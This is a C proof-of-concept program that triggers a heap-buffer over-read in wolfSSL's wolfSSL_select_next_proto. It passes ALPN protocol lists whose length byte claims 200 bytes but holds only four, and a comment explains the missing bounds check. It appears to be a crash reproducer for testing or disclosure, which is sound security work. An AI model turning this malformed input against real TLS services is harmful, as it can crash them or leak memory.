#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>

int main(void)
{
#if defined(HAVE_ALPN) && (defined(OPENSSL_ALL) || defined(WOLFSSL_NGINX) || \
    defined(WOLFSSL_HAPROXY) || defined(HAVE_LIGHTY) || defined(WOLFSSL_QUIC))

    unsigned char* out = NULL;
    unsigned char outLen = 0;
    int ret;

    unsigned char* serverList = (unsigned char*)malloc(5);
    unsigned char* clientList = (unsigned char*)malloc(5);

    if (serverList == NULL || clientList == NULL) {
        fprintf(stderr, "[-] malloc failed\n");
        free(serverList);
        free(clientList);
        return 2;
    }

    /*
     * Length-prefixed protocol list.
     *
     * Malformed shape:
     *   length byte = 200
     *   actual payload bytes = 4
     *
     * Vulnerable wolfSSL_select_next_proto lacks bounds checks and can call
     * XMEMCMP(..., 200), causing a heap-buffer-over-read.
     */
    serverList[0] = 200;
    serverList[1] = 'h';
    serverList[2] = 't';
    serverList[3] = 't';
    serverList[4] = 'p';

    clientList[0] = 200;
    clientList[1] = 's';
    clientList[2] = 'p';
    clientList[3] = 'd';
    clientList[4] = 'y';

    fprintf(stderr, "[*] calling wolfSSL_select_next_proto\n");
    fprintf(stderr, "[*] serverLen: 5, serverList[0]: %u\n", serverList[0]);
    fprintf(stderr, "[*] clientLen: 5, clientList[0]: %u\n", clientList[0]);

    ret = wolfSSL_select_next_proto(&out, &outLen,
                                    serverList, 5,
                                    clientList, 5);

    fprintf(stderr, "[*] wolfSSL_select_next_proto returned: %d\n", ret);
    fprintf(stderr, "[*] outLen: %u\n", outLen);
    fprintf(stderr, "[*] out: %p\n", (void*)out);

    free(serverList);
    free(clientList);

    fprintf(stderr, "[*] cleanup done\n");
    return 0;

#else
    fprintf(stderr, "[-] required build macros not enabled\n");
    fprintf(stderr, "[-] need HAVE_ALPN and OPENSSL_ALL/nginx/haproxy/lighty/quic API guard\n");
    return 77;
#endif
}
